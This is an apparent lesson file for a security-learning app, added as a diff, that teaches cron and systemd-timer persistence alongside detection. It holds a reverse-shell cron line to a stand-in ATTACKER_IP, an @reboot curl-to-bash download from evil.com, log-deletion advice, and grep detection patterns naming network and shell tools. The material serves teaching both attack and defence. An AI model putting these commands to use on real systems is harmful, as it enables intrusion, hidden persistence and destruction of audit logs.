@@ -1,0 +1,110 @@
+{
+    "id": "l4",
+    "chapterId": "ch_11",
+    "title": "Cron for Hackers: Persistence & Stealth",
+    "description": "Use cron for offensive persistence and defensive monitoring. Understand the forensic footprints.",
+    "xpReward": 35,
+    "estimatedMinutes": 8,
+    "section": "Offensive & Defensive",
+    "slides": [
+        {
+            "id": "s_l4_1",
+            "type": "text",
+            "title": "Red Team: Cron as a Persistence Mechanism 🕵️",
+            "content": "# Making Your Access Survive Reboots\n\nWhen you compromise a system, your shell access usually dies when the user logs out or the machine reboots. **Cron** is a classic way to maintain access.\n\n### Technique 1: Reverse Shell Beacon\nAdd a cron job that attempts to connect back to your Command & Control server every few minutes.\n```\n*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\n```\n\n### Technique 2: `@reboot` Script\nPlace a script in the user's crontab that runs at boot, downloading and executing a payload.\n```\n@reboot curl -s http://evil.com/payload.sh | /bin/bash\n```\n\n### Stealth Note:\nUser crontabs are stored in `/var/spool/cron/crontabs/`. A competent defender will check there. To be stealthier, attackers sometimes use **system crontabs** (`/etc/crontab`, `/etc/cron.d/`) which require root but are less frequently audited."
+        },
+        {
+            "id": "s_l4_2",
+            "type": "quiz",
+            "title": "Persistence Logic 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l4_1",
+                "type": "multiple_choice",
+                "question": "Which cron string is best for establishing persistence that survives system reboots?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "*/5 * * * *",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "@reboot",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "@daily",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "`@reboot` runs the command every time the system starts up.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l4_3",
+            "type": "text",
+            "title": "Blue Team: Detecting Malicious Cron Jobs 🛡️",
+            "content": "# Where to Look for Evil\n\nAs a defender or penetration tester assessing your own cleanup, you must know where cron jobs hide.\n\n### Detection Locations:\n1.  **User Crontabs**: `crontab -l` for each user, or check `/var/spool/cron/crontabs/`.\n2.  **System Crontab**: `cat /etc/crontab`\n3.  **Cron Directories**: `ls -la /etc/cron.d/`, `/etc/cron.daily/`, etc.\n4.  **Systemd Timers**: Modern alternative to cron. Check `systemctl list-timers`.\n\n### Suspicious Indicators:\n- Jobs running with **high frequency** (`*/1 * * * *`).\n- Commands containing **obfuscated strings** (`echo d2dld... | base64 -d | bash`).\n- Outbound connections to **unusual IP addresses**.\n- Scripts located in **hidden directories** (`/home/user/.cache/.x.sh`).\n\n**Blue Team Command:**\n```bash\ngrep -r \"curl\\|wget\\|nc\\|bash -i\" /var/spool/cron/\n```"
+        },
+        {
+            "id": "s_l4_4",
+            "type": "code",
+            "title": "Audit All Crontabs (Requires Root)",
+            "content": "Search all user crontabs for suspicious patterns.",
+            "codeSnippet": "sudo grep -r \"/bin/bash\\|nc\\|telnet\\|python\" /var/spool/cron/crontabs/",
+            "codeLanguage": "bash",
+            "canRunCode": true
+        },
+        {
+            "id": "s_l4_5",
+            "type": "text",
+            "title": "Stealthier Persistence: Anacron and Systemd Timers 🥷",
+            "content": "# Evolving Beyond Cron\n\nCron is well-known and easily detected. Advanced attackers (and legitimate sysadmins) are moving to **systemd timers**.\n\n### Why Systemd Timers are Stealthier:\n- Integrated with systemd, so they appear in `systemctl list-timers`, but are often overlooked.\n- Can trigger based on **events** (e.g., when network comes online), not just time.\n- More complex syntax = fewer defenders checking it.\n\n### Example: Malicious Systemd Timer\n1.  Create a service file: `/etc/systemd/system/innocent-look.service`\n2.  Create a timer file: `/etc/systemd/system/innocent-look.timer`\n3.  Enable and start: `systemctl enable innocent-look.timer`\n\n**Forensic Tip:** Use `systemctl list-timers --all` to audit all systemd timers."
+        },
+        {
+            "id": "s_l4_6",
+            "type": "warning",
+            "title": "⚠️ OPSEC Alert: Cron is Logged",
+            "content": "## Every Execution Leaves a Trace\n\nEven if you redirect output to `/dev/null`, the **execution itself** is logged in `/var/log/syslog` (or `journalctl`).\n\n```\nJun 15 10:30:01 hostname CRON[1234]: (user) CMD (/path/to/script.sh)\n```\n\nThere is **no way** to prevent this logging without kernel-level rootkits. \n\n**Mitigation Strategy for Red Teams:**\n- Use legitimate-looking command names (e.g., `system-update-check`).\n- Schedule jobs at times when sysadmins might expect them (e.g., 2:00 AM).\n- Clean up logs if you have root: `sed -i '/CRON.*evil_script/d' /var/log/syslog`."
+        },
+        {
+            "id": "s_l4_7",
+            "type": "quiz",
+            "title": "Forensic Awareness 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l4_2",
+                "type": "multiple_choice",
+                "question": "Where is the execution of cron jobs logged by default?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "~/cron.log",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "/var/log/syslog",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "Nowhere, they are silent.",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "Cron job executions are logged by the cron daemon to syslog.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l4_8",
+            "type": "tip",
+            "title": "Pro Tip 🚀",
+            "content": "## `crontab.guru`\n\nCan't remember the syntax? Use the website **crontab.guru**. It's an interactive editor that explains cron expressions in plain English. Indispensable for both writing and auditing cron jobs."
+        }
+    ]
+}
